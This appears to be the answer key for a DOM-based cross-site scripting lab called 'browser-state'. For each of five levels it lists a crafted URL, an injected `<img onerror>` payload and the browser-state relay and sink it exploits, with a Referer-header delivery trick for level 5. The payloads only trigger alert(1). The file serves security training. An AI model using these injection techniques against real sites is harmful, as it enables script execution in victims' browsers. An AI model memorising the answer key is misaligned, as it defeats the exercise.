# browser-state — solutions

DOM-only sinks where the seed is relayed through browser state (window.name, localStorage, sessionStorage, postMessage, document.referrer) and then written via innerHTML / insertAdjacentHTML / createContextualFragment / srcdoc / document.write.

### browser-state-level1

`/browser-state/level1/?seed=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: seed stored in window.name then innerHTML'd after self-redirect

### browser-state-level2

`/browser-state/level2/?seed=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: seed stored in localStorage then insertAdjacentHTML on next load

### browser-state-level3

`/browser-state/level3/?seed=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: sessionStorage relay + createContextualFragment (executes script-equivalents)

### browser-state-level4

`/browser-state/level4/?seed=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: seed sent through iframe srcdoc + postMessage, innerHTML'd into output

### browser-state-level5

`[Header] /browser-state/level5/?seed=a`

- header: `Referer: http://x/<img src=x onerror=alert(1)>`
- context: child iframe document.write(document.referrer) — payload sourced from Referer (browser URL-encodes via normal nav; use attacker page hosting <a href=… ref-policy unsafe-url> or fetch directly to land raw HTML in Referer)
